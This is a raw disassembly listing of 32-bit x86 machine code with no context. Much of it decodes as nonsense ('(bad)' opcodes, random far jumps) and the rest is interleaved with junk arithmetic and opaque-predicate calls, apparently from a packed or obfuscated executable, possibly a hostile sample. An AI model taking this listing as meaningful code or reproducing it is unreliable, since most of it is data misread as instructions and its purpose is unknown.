  401841:	pop    ds
  401842:	adc    cl,ah
  401844:	and    al,0xda
  401846:	lock fwait
  401848:	js     0x4018a0
  40184a:	sar    BYTE PTR [bx+di-0x2c],0xdc
  40184f:	test   edi,ecx
  401851:	in     al,0x24
  401853:	adc    DWORD PTR [bp+si+0x35],eax
  401857:	aad    0xd7
  401859:	or     al,0x9b
  40185b:	loope  0x4018c8
  40185d:	outs   dx,BYTE PTR ds:[esi]
  40185e:	mov    esi,0x1b913e96
  401863:	inc    edx
  401864:	pop    esp
  401865:	sti    
  401866:	adc    BYTE PTR [ecx+ecx*2+0x77],0x8f
  40186b:	stc    
  40186c:	lods   al,BYTE PTR ds:[esi]
  40186d:	sar    BYTE PTR [edx-0x240caf45],cl
  401873:	fucomp st(0)
  401875:	pop    edx
  401876:	push   eax
  401877:	jno    0x401847
  401879:	add    al,0x19
  40187b:	lea    ebp,[edi-0x47]
  40187e:	ret    0xb630
  401881:	aas    
  401882:	(bad)  [ecx+0x551a5ccd]
  401888:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401889:	or     BYTE PTR [edx-0x5b6c3b3f],cl
  40188f:	adc    BYTE PTR ds:0x748c0428,ah
  401895:	dec    eax
  401896:	lock lock clc 
  401899:	xor    eax,0x974d7770
  40189e:	jne    0x401866
  4018a0:	adc    DWORD PTR [eax+0x2e6392fc],ecx
  4018a6:	loopne 0x4018a4
  4018a8:	jae    0x401893
  4018aa:	push   ebx
  4018ab:	dec    esp
  4018ac:	retf   
  4018ad:	pop    eax
  4018ae:	add    ecx,DWORD PTR [edi-0x53]
  4018b1:	cmp    al,0x59
  4018b3:	adc    edi,edx
  4018b5:	or     edi,DWORD PTR [edi+0x2]
  4018b8:	ror    BYTE PTR [edi-0x33],cl
  4018bb:	dec    edi
  4018bc:	(bad)  
  4018bd:	loop   0x401927
  4018bf:	nop
  4018c0:	sbb    esi,DWORD PTR [esp+ebp*1+0x6b0ffd7b]
  4018c7:	jnp    0x40187a
  4018c9:	and    cl,BYTE PTR [esi+0x40]
  4018cc:	sbb    dh,bh
  4018ce:	jns    0x4018ed
  4018d0:	jne    0x401906
  4018d2:	in     al,dx
  4018d3:	in     eax,0x6d
  4018d5:	inc    esp
  4018d6:	pop    es
  4018d7:	in     eax,0xd
  4018d9:	(bad)  
  4018db:	arpl   WORD PTR [edx+edi*2+0x47],si
  4018df:	sbb    al,0x9a
  4018e1:	inc    ecx
  4018e2:	sbb    DWORD PTR [ecx+ebx*4],0x63
  4018e6:	xor    al,0x6e
  4018e8:	sub    cl,BYTE PTR [ebx+edi*1-0x1d]
  4018ec:	gs xor eax,0x80e674e9
  4018f2:	mov    ds,ecx
  4018f4:	pop    ecx
  4018f5:	mov    ds:0x490a4ee3,eax
  4018fa:	call   0xdeaf:0xf278c307
  401901:	push   esi
  401902:	jecxz  0x401976
  401904:	adc    al,ah
  401906:	and    eax,0x1d254d31
  40190b:	xchg   DWORD PTR [ebx+0x4f],esi
  40190e:	fs add eax,0xd245ac4b
  401914:	data16 mov dl,0x4e
  401917:	xchg   esi,eax
  401918:	add    edx,0x14
  40191b:	sub    al,0x74
  40191d:	or     bh,BYTE PTR [ecx+0x628bb42a]
  401923:	stos   BYTE PTR es:[edi],al
  401924:	lods   eax,DWORD PTR ds:[esi]
  401925:	icebp  
  401926:	fidiv  DWORD PTR [esp+esi*8-0x79baf596]
  40192d:	(bad)  
  40192f:	cmp    BYTE PTR [edx-0x3dd4b9ae],dl
  401935:	mov    edx,0x31ab
  40193a:	mov    DWORD PTR [ebp-0x58],eax
  40193d:	sbb    ecx,edi
  40193f:	cmp    DWORD PTR ds:0x428277,0x0
  401946:	not    DWORD PTR ds:0x4282ef
  40194c:	mov    edi,DWORD PTR ds:0x428193
  401952:	mov    DWORD PTR ds:0x42828f,edi
  401958:	jmp    0x4019ab
  40195d:	mov    DWORD PTR ds:0x4282fb,0x77e1
  401967:	not    edi
  401969:	cmp    DWORD PTR ds:0x428277,0x0
  401970:	jge    0x401993
  401976:	push   0x637b
  40197b:	call   DWORD PTR ds:0x428d7c
  401981:	mov    edx,DWORD PTR ds:0x428397
  401987:	adc    DWORD PTR ds:0x4282ff,edx
  40198d:	and    edx,DWORD PTR ds:0x42824f
  401993:	add    DWORD PTR ds:0x42827f,edx
  401999:	mov    edi,DWORD PTR ds:0x428173
  40199f:	xor    DWORD PTR ds:0x42819b,edi
  4019a5:	and    DWORD PTR ds:0x42816b,ecx
  4019ab:	mov    DWORD PTR [ebp-0x54],ecx
  4019ae:	mov    ecx,DWORD PTR ds:0x42837b
  4019b4:	sub    ecx,DWORD PTR ds:0x42827b
  4019ba:	mov    DWORD PTR ds:0x42837b,ecx
  4019c0:	or     DWORD PTR [ebp-0x58],0xca78b059
  4019c7:	sbb    DWORD PTR ds:0x42838b,edx
  4019cd:	or     DWORD PTR [ebp-0x54],0x9c1b89e8
  4019d4:	adc    edx,edx
  4019d6:	lea    eax,[ebp+0x20]
  4019d9:	mov    DWORD PTR [ebp-0xc],eax
  4019dc:	mov    DWORD PTR ds:0x428383,0x339b
  4019e6:	mov    eax,ds:0x4223d0
  4019eb:	cmp    DWORD PTR ds:0x428267,0x0
  4019f2:	mov    edx,0x5699
  4019f7:	movzx  edx,BYTE PTR ds:0x428277
  4019fe:	mov    edi,0xa42
  401a03:	jmp    0x401a5a
  401a08:	not    edi
  401a0a:	mov    edi,0x2eea
  401a0f:	cmp    DWORD PTR ds:0x428267,0x0
  401a16:	jg     0x401a44
  401a1c:	push   0x3b91
  401a21:	push   0x428287
  401a26:	push   DWORD PTR [ebp-0x1c]
  401a29:	push   0x478c
  401a2e:	call   DWORD PTR ds:0x428e68
  401a34:	adc    ecx,ecx
  401a36:	sbb    ecx,DWORD PTR ds:0x428187
  401a3c:	neg    edx
  401a3e:	adc    ecx,DWORD PTR ds:0x428177
  401a44:	sub    DWORD PTR ds:0x428303,ecx
  401a4a:	add    DWORD PTR ds:0x428183,0x42827b
  401a54:	xor    edx,DWORD PTR ds:0x4282eb
  401a5a:	mov    ecx,DWORD PTR [ebp-0xc]
  401a5d:	mov    eax,DWORD PTR [eax]
  401a5f:	add    eax,DWORD PTR [ecx]
  401a61:	sub    DWORD PTR ds:0x428193,edi
  401a67:	mov    edi,0x329e695d
  401a6c:	mov    DWORD PTR [ebp-0x14],eax
  401a6f:	inc    edx
  401a70:	mov    eax,DWORD PTR [ebp+0x18]
  401a73:	cmp    DWORD PTR ds:0x428193,0x0
  401a7a:	mov    edx,DWORD PTR ds:0x428267
  401a80:	mov    edx,0x3ce6
  401a85:	mov    DWORD PTR ds:0x42831f,0xa37
  401a8f:	jmp    0x401ae6
  401a94:	mov    DWORD PTR ds:0x42826b,0x206f
  401a9e:	cmp    DWORD PTR ds:0x428193,0x0
  401aa5:	jg     0x401ac8
  401aab:	push   0x47a2
  401ab0:	push   0x8c73
  401ab5:	push   0x8ece
  401aba:	call   DWORD PTR ds:0x428d80
  401ac0:	sub    edx,DWORD PTR ds:0x4283a3
  401ac6:	or     edx,ecx
  401ac8:	sub    ecx,0x6960
  401ace:	mov    ecx,DWORD PTR ds:0x42838f
  401ad4:	adc    ecx,DWORD PTR ds:0x42817f
  401ada:	mov    DWORD PTR ds:0x42838f,ecx
  401ae0:	xor    edx,DWORD PTR ds:0x42817b
  401ae6:	mov    ecx,DWORD PTR [ebp+0x1c]
  401ae9:	shrd   eax,ecx,0x2
  401aed:	cmp    DWORD PTR ds:0x428163,0x0
  401af4:	mov    edx,0x4200
  401af9:	mov    DWORD PTR ds:0x428277,0x6ba0
  401b03:	mov    DWORD PTR ds:0x42818f,0x1855
  401b0d:	jmp    0x401b6b
  401b12:	mov    DWORD PTR ds:0x42816f,0x2fa6
  401b1c:	cmp    DWORD PTR ds:0x428163,0x0
  401b23:	jge    0x401b53
  401b29:	push   DWORD PTR [ebp-0x28]
  401b2c:	push   DWORD PTR [ebp-0x20]
  401b2f:	push   0x672f
  401b34:	call   DWORD PTR ds:0x428ed0
  401b3a:	movzx  edx,WORD PTR ds:0x42829f
  401b41:	and    edx,DWORD PTR ds:0x42817b
  401b47:	mov    DWORD PTR ds:0x42829f,edx
  401b4d:	and    DWORD PTR ds:0x428257,edx
  401b53:	add    DWORD PTR ds:0x42839b,edx
  401b59:	sub    edx,DWORD PTR ds:0x4282a3
  401b5f:	add    DWORD PTR ds:0x42825b,edi
  401b65:	or     edx,DWORD PTR ds:0x428387
  401b6b:	shr    ecx,0x2
  401b6e:	mov    ecx,DWORD PTR [ebp+0x18]
  401b71:	cmp    DWORD PTR ds:0x42830b,0x0
  401b78:	mov    DWORD PTR ds:0x4282a3,0x3b05
  401b82:	mov    edx,0x7243
  401b87:	mov    DWORD PTR ds:0x428173,0x6e0d
  401b91:	jmp    0x401bec
  401b96:	mov    edx,0x2e5f
  401b9b:	mov    edx,DWORD PTR ds:0x428247
  401ba1:	cmp    DWORD PTR ds:0x42830b,0x0
  401ba8:	je     0x401be0
  401bae:	push   DWORD PTR [ebp-0x18]
  401bb1:	push   DWORD PTR [ebp-0x20]
  401bb4:	push   DWORD PTR [ebp-0x10]
  401bb7:	push   0x15fe
  401bbc:	push   0x400000
  401bc1:	call   DWORD PTR ds:0x428d94
  401bc7:	sub    DWORD PTR ds:0x4282f7,ecx
  401bcd:	movzx  edx,WORD PTR ds:0x42825b
  401bd4:	add    DWORD PTR ds:0x428307,edx
  401bda:	add    DWORD PTR ds:0x42815f,ebx
  401be0:	sbb    DWORD PTR ds:0x42822f,edi
  401be6:	inc    DWORD PTR ds:0x42822f
  401bec:	mov    edx,DWORD PTR [ebp+0x1c]
  401bef:	xor    eax,edi
  401bf1:	xor    edx,edx
  401bf3:	or     DWORD PTR ds:0x428393,0x428237
  401bfd:	or     edx,eax
  401bff:	jmp    0x401fdd
  401c04:	xchg   ebp,eax
  401c05:	xchg   ecx,eax
  401c06:	je     0x401c58
  401c08:	ins    BYTE PTR es:[edi],dx
  401c09:	sub    al,0x2d
  401c0b:	dec    esp
  401c0c:	and    eax,0xcbb0afeb
  401c11:	loope  0x401bf2
  401c13:	jle    0x401c3a
  401c15:	or     bl,BYTE PTR [eax]
  401c17:	sbb    BYTE PTR [esi-0x48e7e7ee],bl
  401c1d:	cmp    al,0x35
  401c1f:	stc    
  401c20:	fcmovnbe st,st(7)
  401c22:	dec    edx
  401c23:	mov    BYTE PTR [ebp-0x4e3bcf36],bh
  401c29:	xor    BYTE PTR [eax-0x32],0xd2
  401c2d:	stos   DWORD PTR es:[edi],eax
  401c2e:	in     al,0xde
  401c30:	mov    eax,ds:0x972e5e12
  401c35:	pop    ebp
  401c36:	push   edx
  401c37:	retf   
  401c38:	inc    ebx
  401c39:	std    
  401c3a:	adc    ebp,DWORD PTR [ebp+0x455b13da]
  401c40:	or     DWORD PTR [eax+0x978be03],esi
  401c46:	shl    ebp,cl
  401c48:	or     eax,0xfa72d1b6
  401c4d:	inc    edx
  401c4e:	out    dx,al
  401c4f:	int3   
  401c50:	dec    esi
  401c51:	scas   eax,DWORD PTR es:[edi]
  401c52:	outs   dx,BYTE PTR ds:[esi]
  401c53:	outs   dx,DWORD PTR ds:[esi]
  401c54:	loope  0x401c21
  401c56:	mov    esp,0xa59e6dca
  401c5b:	pop    ebp
  401c5c:	fwait
  401c5d:	cmp    eax,0x5de73b23
  401c62:	das    
  401c63:	ret    
  401c64:	push   eax
  401c65:	mov    esi,DWORD PTR [esi+ebp*1-0x73c579b9]
  401c6c:	cmp    DWORD PTR [edx+0x5af6e4a5],0x4ae0ccbc
  401c76:	pop    eax
  401c77:	and    al,0xcd
  401c79:	jno    0x401c19
  401c7b:	popa   
  401c7c:	fwait
  401c7d:	(bad)  
  401c7e:	pop    edx
  401c7f:	in     eax,dx
  401c80:	std    
  401c81:	sub    ebp,ecx
  401c83:	mov    eax,0x302636bb
  401c88:	les    edx,FWORD PTR ds:0x24d38bfd
  401c8e:	ds je  0x401c57
  401c91:	jmp    0x1ebe:0x262e6be1
  401c98:	js     0x401cf2
  401c9a:	mov    al,0xca
  401c9c:	sti    
  401c9d:	fsubr  DWORD PTR [ecx]
  401c9f:	push   edi
  401ca0:	outs   dx,DWORD PTR ds:[esi]
  401ca1:	mov    ch,0x8b
  401ca3:	fsubr  QWORD PTR [ebx+0x0]
  401ca6:	bound  ecx,QWORD PTR [eax+eax*4]
  401ca9:	retf   0xd014
  401cac:	mov    bl,0x2e
  401cae:	inc    ebp
  401caf:	mov    ds:0xa80d996e,al
  401cb4:	adc    al,0x44
  401cb6:	xchg   edi,eax
  401cb7:	pop    ebp
  401cb8:	inc    edx
  401cb9:	add    ebp,DWORD PTR [edi-0xa]
  401cbc:	jbe    0x401c4f
  401cbe:	mov    ecx,0x472f3a59
  401cc3:	xor    esp,edi
  401cc5:	or     DWORD PTR [ebx],ecx
  401cc7:	jl     0x401cf6
  401cc9:	test   BYTE PTR [ebx+0x77],dh
  401ccc:	push   cs
  401ccd:	jb     0x401d3e
  401ccf:	xchg   edi,eax
  401cd0:	push   eax
  401cd1:	repz jmp 0xb62ca32e
  401cd7:	xchg   ecx,esi
  401cd9:	xlat   BYTE PTR ds:[ebx]
  401cda:	loopne 0x401cf2
  401cdc:	aad    0x0
  401cde:	clc    
  401cdf:	push   ss
  401ce0:	push   ebp
  401ce1:	cmp    BYTE PTR [eax+0x37],dh
  401ce4:	retf   
  401ce5:	mov    BYTE PTR [eax],ch
  401ce7:	popf   
  401ce8:	(bad)  
  401ce9:	repnz sub al,0xa3
  401cec:	loop   0x401d0b
  401cee:	mov    ch,0xd2
  401cf0:	retf   
  401cf1:	outs   dx,BYTE PTR ds:[esi]
  401cf2:	mov    ah,0xbe
  401cf4:	push   esp
  401cf5:	push   ebx
  401cf6:	ret    0x5af0
  401cf9:	(bad)  
  401cfa:	shr    BYTE PTR [ebx+0x4f],cl
  401cfd:	add    edx,ecx
  401cff:	ret    0x3cd8
  401d02:	int    0x31
  401d04:	add    al,0x9
  401d06:	and    eax,0x5e6b9aa7
  401d0b:	adc    BYTE PTR [ecx+edx*4-0x7085e68b],bh
  401d12:	mov    ebx,0xe2090760
  401d17:	xchg   edx,eax
  401d18:	push   ss
  401d19:	jle    0x401cf1
  401d1b:	popf   
  401d1c:	and    BYTE PTR [esi-0x51],dh
  401d1f:	pop    es
  401d20:	retf   
  401d21:	lds    esp,FWORD PTR [ebp+0x7a]
  401d24:	imul   eax,DWORD PTR ds:0x2044d574,0x48
  401d2b:	adc    edi,DWORD PTR [edi+0x5d2a0658]
  401d31:	mov    bh,0x7d
  401d33:	hlt    
  401d34:	int3   
  401d35:	sub    DWORD PTR [ebp-0x16707b1],edi
  401d3b:	jl     0x401cc4
  401d3d:	ja     0x401d6d
  401d3f:	dec    eax
  401d40:	jle    0x401d9d
  401d42:	pushf  
  401d43:	mov    bh,0xcc
  401d45:	rcr    BYTE PTR [edi],0x69
  401d48:	out    0x1a,al
  401d4a:	cmc    
  401d4b:	adc    DWORD PTR [edx+0x32f9100e],esp
  401d51:	(bad)  
  401d52:	pop    ecx
  401d53:	mov    ds:0x1fa52c,al
  401d58:	in     eax,0xc5
  401d5a:	sub    bl,dh
  401d5c:	xor    cl,BYTE PTR [edi-0x6a]
  401d5f:	push   edx
  401d60:	popa   
  401d61:	add    BYTE PTR [esi+0x57],0x4d
  401d65:	int    0xde
  401d67:	mov    esp,0x1e1a0e00
  401d6c:	pop    esp
  401d6d:	lock aas 
  401d6f:	jmp    0xd093a5f9
  401d74:	sub    ecx,DWORD PTR [ebx-0x15f8f48a]
  401d7a:	or     eax,0xf13189a3
  401d7f:	add    eax,0x419c65b9
  401d84:	enter  0x443,0xc8
  401d88:	or     BYTE PTR [esi],ah
  401d8a:	sub    BYTE PTR gs:[edx],0xf4
  401d8e:	pop    es
  401d8f:	pop    edi
  401d90:	xchg   edx,eax
  401d91:	das    
  401d92:	lahf   
  401d93:	fs inc esi
  401d95:	pop    esi
  401d96:	pop    edi
  401d97:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401d98:	ss push ebp
  401d9a:	mov    dh,0x97
  401d9c:	xor    dh,bl
  401d9e:	add    eax,0x52ea7b27
  401da3:	pop    edx
  401da4:	dec    eax
  401da5:	nop
  401da6:	xchg   esi,eax
  401da7:	or     eax,ebx
  401da9:	xor    ebp,DWORD PTR [edx+0x31]
  401dac:	loope  0x401da3
  401dae:	push   edx
  401daf:	sbb    eax,0x2ccb4a7d
  401db4:	pop    esp
  401db5:	mov    ecx,0xda480c16
  401dba:	add    eax,DWORD PTR [esi]
  401dbc:	data16 rcl BYTE PTR [ecx-0x6addbfd1],1
  401dc3:	jns    0x401df0
  401dc5:	nop
  401dc6:	mov    ds:0xab594830,eax
  401dcb:	add    ch,dh
  401dcd:	cmp    ebx,DWORD PTR [eax+0x2e]
  401dd0:	inc    edx
  401dd1:	and    DWORD PTR [ebp-0x71],eax
  401dd4:	aam    0x91
  401dd6:	imul   esi,DWORD PTR [edi+0x3a],0x21a1b635
  401ddd:	data16 inc sp
  401de0:	call   0x4044:0x5098605d
  401de7:	inc    edi
  401de8:	push   esp
  401de9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401dea:	dec    edx
  401deb:	loop   0x401dc7
  401ded:	lea    esp,[ebp-0x37]
  401df0:	xchg   esp,eax
  401df1:	mov    dl,0x3
  401df3:	pop    ebx
  401df4:	xor    DWORD PTR [ebx-0x51dc293a],0x3ffebf8a
  401dfe:	adc    eax,0xd2cb4fb2
  401e03:	mov    edx,0x4d64d9da
  401e08:	xchg   BYTE PTR [ebx-0x3944555b],dl
  401e0e:	ret    
  401e0f:	mov    ecx,0x7dd14178
  401e14:	jno    0x401e91
  401e16:	adc    ebx,DWORD PTR [ebx+0x512b4faf]
  401e1c:	inc    edi
  401e1d:	or     ch,bl
  401e1f:	(bad)  
  401e20:	out    dx,eax
  401e21:	je     0x401da6
  401e23:	jl     0x401dfe
  401e25:	sbb    BYTE PTR [edi+0x53ad8422],0x53
  401e2c:	dec    ecx
  401e2d:	mov    ds:0x9a3e44d3,al
  401e32:	repnz mov ecx,0xc2ce3b42
  401e38:	pop    esp
  401e39:	outs   dx,DWORD PTR ds:[esi]
  401e3a:	out    0xca,eax
  401e3c:	mov    ds,ebx
  401e3e:	or     BYTE PTR [edi-0x21],dl
  401e41:	jb     0x401dfd
  401e43:	sub    ch,BYTE PTR [edi+0xf]
  401e46:	clc    
  401e47:	mov    edi,0x1847f667
  401e4c:	jp     0x401e9c
  401e4e:	adc    BYTE PTR [ecx],ch
  401e50:	sbb    al,0x8f
  401e52:	cwde   
  401e53:	lods   eax,DWORD PTR ds:[esi]
  401e54:	cmp    al,0xd4
  401e56:	stc    
  401e57:	push   esp
  401e58:	enter  0x84f1,0x5b
  401e5c:	add    al,0x1e
  401e5e:	rcl    BYTE PTR [eax+ecx*4],0x3e
  401e62:	rol    DWORD PTR [esp+edx*4+0x11],0xd
  401e67:	out    dx,al
  401e68:	hlt    
  401e69:	idiv   ch
  401e6b:	out    dx,al
  401e6c:	xchg   ebp,eax
  401e6d:	lods   al,BYTE PTR ds:[esi]
  401e6e:	pop    esp
  401e6f:	retf   
  401e70:	aam    0xe4
  401e72:	cwde   
  401e73:	jbe    0x401e8e
  401e75:	or     al,0x95
  401e77:	inc    ecx
  401e78:	js     0x401ec3
  401e7a:	clc    
  401e7b:	adc    bl,BYTE PTR [edx+0x76d630ab]
  401e81:	fcomi  st,st(6)
  401e83:	(bad)  
  401e84:	pop    ds
  401e85:	test   BYTE PTR [edi-0x10],ch
  401e88:	pop    esi
  401e89:	xchg   BYTE PTR [ebx],bh
  401e8b:	loop   0x401e3f
  401e8d:	sbb    al,0xce
  401e8f:	cdq    
  401e90:	pop    ds
  401e91:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401e92:	iret   
  401e93:	dec    esp
  401e94:	pop    es
  401e95:	push   ecx
  401e96:	inc    esi
  401e97:	or     DWORD PTR [ecx-0xa76d551],0x58101db0
  401ea1:	int3   
  401ea2:	jge    0x401f1a
  401ea4:	arpl   WORD PTR [ebx],si
  401ea6:	retf   0x5eb7
  401ea9:	shr    BYTE PTR [esi],1
  401eab:	jmp    0xc74613ae
  401eb0:	stc    
  401eb1:	dec    ebx
  401eb2:	add    ebp,DWORD PTR [edi-0x46]
  401eb5:	mov    esi,0x7ca91068
  401eba:	cmc    
  401ebb:	fwait
  401ebc:	ss dec ecx
  401ebe:	dec    esi
  401ebf:	dec    eax
  401ec0:	std    
  401ec1:	(bad)  
  401ec2:	xor    eax,0xd5652018
  401ec7:	cdq    
  401ec8:	cmp    BYTE PTR [esi+0xa],cl
  401ecb:	scas   eax,DWORD PTR es:[edi]
  401ecc:	push   ebp
  401ecd:	js     0x401e59
  401ecf:	pushf  
  401ed0:	rol    DWORD PTR [ebx-0x72],cl
  401ed3:	js     0x401e6a
  401ed5:	sbb    BYTE PTR [ebp+0x45],0x66
  401ed9:	fcom   QWORD PTR [esi-0x6c]
  401edc:	scas   eax,DWORD PTR es:[edi]
  401edd:	inc    esi
  401ede:	push   ecx
  401edf:	cmp    esi,DWORD PTR [edi+eax*2+0x3d]
  401ee3:	ins    BYTE PTR es:[edi],dx
  401ee4:	cmp    ecx,eax
  401ee6:	mov    WORD PTR [ebp+esi*1-0x736c204],?
  401eed:	sub    ch,BYTE PTR [edi-0x50]
  401ef0:	xchg   edi,eax
  401ef1:	shl    edx,cl
  401ef3:	call   0xef8f:0x50d0c9a
  401efa:	cmp    DWORD PTR [edi+0x5c],edi
  401efd:	mov    bl,0x8
  401eff:	mov    ds:0xfee803be,eax
  401f04:	sbb    eax,0x4283348
  401f09:	inc    ecx
  401f0a:	lods   al,BYTE PTR ds:[esi]
  401f0b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401f0c:	aaa    
  401f0d:	mov    ds:0xccacb8c4,al
  401f12:	stos   BYTE PTR es:[edi],al
  401f13:	xchg   bl,cl
  401f15:	xor    bl,BYTE PTR [ebx+0x4bc82968]
  401f1b:	jne    0x401f2e
  401f1d:	mov    eax,ds:0x95b1bf28
  401f22:	xchg   ecx,eax
  401f23:	inc    ebx
  401f24:	ins    BYTE PTR es:[edi],dx
  401f25:	mov    esp,0x6d4100b0
  401f2a:	addr16 push edi
  401f2c:	push   ds
  401f2d:	add    al,0xd2
  401f2f:	cmp    eax,0x786dd56d
  401f34:	pusha  
  401f35:	jo     0x401f41
  401f37:	jl     0x401f2c
  401f39:	push   esp
  401f3a:	repz add BYTE PTR [edi],al
  401f3d:	fidivr WORD PTR [eax-0x2b]
  401f40:	or     bl,BYTE PTR [esi]
  401f42:	push   ebx
  401f43:	cmc    
  401f44:	adc    esp,DWORD PTR [edx]
  401f46:	lods   al,BYTE PTR ds:[esi]
  401f47:	pop    esp
  401f48:	sti    
  401f49:	leave  
  401f4a:	in     eax,0x20
  401f4c:	loope  0x401f93
  401f4e:	inc    ecx
  401f4f:	add    ebx,eax
  401f51:	add    DWORD PTR [eax+edi*1],ebp
  401f54:	mov    BYTE PTR [edx],ch
  401f56:	sub    BYTE PTR [edi-0x280eaee3],al
  401f5c:	push   0x374b5443
  401f61:	test   eax,0xedfb613d
  401f66:	loopne 0x401eee
  401f68:	in     al,0xcf
  401f6a:	push   cs
  401f6b:	mov    bl,0x80
  401f6d:	xchg   edx,eax
  401f6e:	out    0x11,eax
  401f70:	fwait
  401f71:	mov    al,0x1b
  401f73:	adc    eax,0x56f51d04
  401f78:	ror    BYTE PTR [ecx-0x4b],1
  401f7b:	in     eax,0x6e
  401f7d:	cwde   
  401f7e:	xor    eax,0x41a23347
  401f83:	jmp    0x9afa7328
  401f88:	pmaxub mm1,mm5
  401f8b:	jns    0x401f9a
  401f8d:	ret    
  401f8e:	repnz or DWORD PTR [ecx],ebx
  401f91:	(bad)  
  401f92:	out    dx,al
  401f93:	std    
  401f94:	(bad)  
  401f95:	js     0x401f9e
  401f97:	mov    ecx,0x1f5235dc
  401f9c:	mov    dl,0xd8
  401f9e:	inc    eax
  401f9f:	xchg   BYTE PTR [edi],dl
  401fa1:	xchg   ebp,eax
  401fa2:	add    eax,0x1f73cc2a
  401fa7:	jp     0x401f30
  401fa9:	xor    ecx,DWORD PTR [ecx+0x47964e73]
  401faf:	jne    0x401fa2
  401fb1:	mov    dh,0xd3
  401fb3:	(bad)  
  401fb4:	fbstp  TBYTE PTR [ebx]
  401fb6:	test   DWORD PTR [eax-0x2],0xc40ad700
  401fbd:	and    al,0x2a
  401fbf:	out    0x13,eax
  401fc1:	out    dx,eax
  401fc2:	jae    0x401fc7
  401fc4:	sbb    eax,0x7854f480
  401fc9:	mov    ebp,0x4b045156
  401fce:	and    ebx,DWORD PTR [ebp+0x12]
  401fd1:	adc    edx,DWORD PTR [ebx]
  401fd3:	sar    BYTE PTR [edi+0x51ee2f33],0xee
  401fda:	stos   DWORD PTR es:[edi],eax
  401fdb:	fdivrp st(6),st
  401fdd:	mov    DWORD PTR [ebp-0x3c],edx
  401fe0:	mov    DWORD PTR [ebp-0x70],0x2c55
  401fe7:	mov    eax,ds:0x42836b
  401fec:	adc    DWORD PTR ds:0x4283a7,eax
  401ff2:	mov    DWORD PTR [ebp-0x6c],0x456f
  401ff9:	cmp    DWORD PTR ds:0x42838b,0x0
  402000:	mov    DWORD PTR ds:0x42828b,0x4df8
  40200a:	mov    DWORD PTR ds:0x428373,0x33aa
  402014:	jmp    0x402076
  402019:	mov    eax,0x569b
  40201e:	mov    eax,0x2370
  402023:	cmp    DWORD PTR ds:0x42838b,0x0
  40202a:	jbe    0x40205c
  402030:	push   DWORD PTR [ebp-0xc]
  402033:	push   0x3ea9
  402038:	call   DWORD PTR ds:0x428d98
  40203e:	or     DWORD PTR ds:0x42816f,0x6f29
  402048:	xor    DWORD PTR ds:0x42830b,0x4282ff
  402052:	add    DWORD PTR ds:0x42828b,0x428327
  40205c:	and    DWORD PTR ds:0x42839b,edi
  402062:	mov    DWORD PTR ds:0x42827b,0x2a04
  40206c:	sub    DWORD PTR ds:0x42819b,0x42815b
  402076:	mov    DWORD PTR [ebp-0x70],0x78a6
  40207d:	cmp    DWORD PTR ds:0x4282ef,0x0
  402084:	mov    DWORD PTR ds:0x4282eb,ecx
  40208a:	mov    DWORD PTR ds:0x428197,0x59f
  402094:	mov    DWORD PTR ds:0x428197,ecx
  40209a:	mov    DWORD PTR ds:0x428317,0x5800
  4020a4:	jmp    0x402119
  4020a9:	mov    eax,0x445d
  4020ae:	cmp    DWORD PTR ds:0x4282ef,0x0
  4020b5:	ja     0x4020ec
  4020bb:	push   0x42816b
  4020c0:	push   DWORD PTR [ebp-0x10]
  4020c3:	push   0x842c
  4020c8:	call   DWORD PTR ds:0x428ed4
  4020ce:	sbb    DWORD PTR ds:0x42837b,0x4ff2
  4020d8:	xor    DWORD PTR ds:0x4282fb,0x42826f
  4020e2:	adc    DWORD PTR ds:0x42836f,0x4c73
  4020ec:	add    DWORD PTR ds:0x42836f,0x42839f
  4020f6:	and    DWORD PTR ds:0x428157,0x428373
  402100:	sbb    DWORD PTR ds:0x42815b,0x5f9d
  40210a:	sbb    DWORD PTR ds:0x4282ef,0x42829f
  402114:	sbb    eax,0x5252
  402119:	mov    DWORD PTR [ebp-0x6c],0x188
  402120:	neg    eax
  402122:	mov    DWORD PTR [ebp-0x70],0x5b3f
  402129:	mov    DWORD PTR [ebp-0x6c],0x3219
  402130:	mov    DWORD PTR [ebp-0x70],0x231c
  402137:	mov    eax,ds:0x4282eb
  40213c:	add    DWORD PTR ds:0x428287,eax
  402142:	mov    DWORD PTR [ebp-0x6c],0x1337
  402149:	mov    eax,ds:0x42837b
  40214e:	add    DWORD PTR ds:0x428317,eax
  402154:	mov    DWORD PTR [ebp-0x70],0x7593
  40215b:	cmp    DWORD PTR ds:0x428167,0x0
  402162:	mov    DWORD PTR ds:0x42838b,0x750f
  40216c:	not    DWORD PTR ds:0x428373
  402172:	jmp    0x4021e4
  402177:	mov    DWORD PTR ds:0x42826b,0x610f
  402181:	mov    eax,ds:0x42817f
  402186:	cmp    DWORD PTR ds:0x428167,0x0
  40218d:	jle    0x4021c5
  402193:	push   0x428069
  402198:	push   DWORD PTR [ebp-0x28]
  40219b:	push   0x1818
  4021a0:	push   DWORD PTR [ebp-0x18]
  4021a3:	push   0x8e39
  4021a8:	push   DWORD PTR [ebp-0x1c]
  4021ab:	call   DWORD PTR ds:0x428e70
  4021b1:	adc    DWORD PTR ds:0x42828f,0x428263
  4021bb:	add    DWORD PTR ds:0x42824f,0x168f
  4021c5:	sub    DWORD PTR ds:0x4282f3,0x428193
  4021cf:	or     DWORD PTR ds:0x428393,0xa53
  4021d9:	mov    eax,ds:0x428247
  4021de:	xor    DWORD PTR ds:0x42815b,eax
  4021e4:	mov    DWORD PTR [ebp-0x6c],0x11b8
  4021eb:	xor    eax,0x39f6
  4021f0:	jmp    0x4025ce
  4021f5:	stos   DWORD PTR es:[edi],eax
  4021f6:	fisttp QWORD PTR [edi+0x32]
  4021f9:	aas    
  4021fa:	and    ch,BYTE PTR [edx-0x2c2c85a4]
  402200:	mov    esp,0xbeec810a
  402205:	stos   DWORD PTR es:[edi],eax
  402206:	add    bl,BYTE PTR [eax]
  402208:	sbb    BYTE PTR [esi-0x47e7e7ee],bl
  40220e:	mov    esp,0x4d4ef85b
  402213:	ins    DWORD PTR es:[edi],dx
  402214:	scas   eax,DWORD PTR es:[edi]
  402215:	jmp    FWORD PTR [edx+0xe]
  402218:	pop    es
  402219:	fs (bad) 
  40221b:	jmp    0x2b9d:0x6944a904
  402222:	cmp    BYTE PTR [ecx-0xd72b992],ah
  402228:	mov    ebp,0x5f7a89a5
